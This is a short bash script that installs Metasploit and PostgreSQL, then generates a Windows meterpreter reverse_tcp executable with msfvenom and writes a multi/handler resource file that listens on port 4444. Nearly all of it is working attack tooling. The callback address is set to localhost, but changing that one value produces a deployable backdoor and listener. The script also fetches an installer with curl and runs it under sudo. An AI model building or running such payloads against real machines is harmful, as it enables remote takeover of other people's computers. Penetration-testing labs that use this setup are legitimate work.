#!/bin/bash

#install metasploit
sudo curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
sudo chmod +x msfinstall

#install posrgresql
sudo apt install postgresql -y 
sudo systemctl start postgresql
sudo systemctl enable postgresql

#start metasploit db
sudo ./msfinstall
sudo msfdb init

# Create payload directory
echo "[*] Creating payload directory..."
mkdir -p ~/payloads

# Generate payload
echo "[*] Generating payload..."
msfvenom \
    -p windows/meterpreter/reverse_tcp \
    LHOST=127.0.0.1 \
    LPORT=4444 \
    -f exe \
    -o ~/payloads/test_payload.exe


#set payload and host variables
sudo cat > handler.rc << EOF
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
run
EOF

echo "[*] Setup complete. To start the handler:"
echo "msfconsole -r handler.rc"
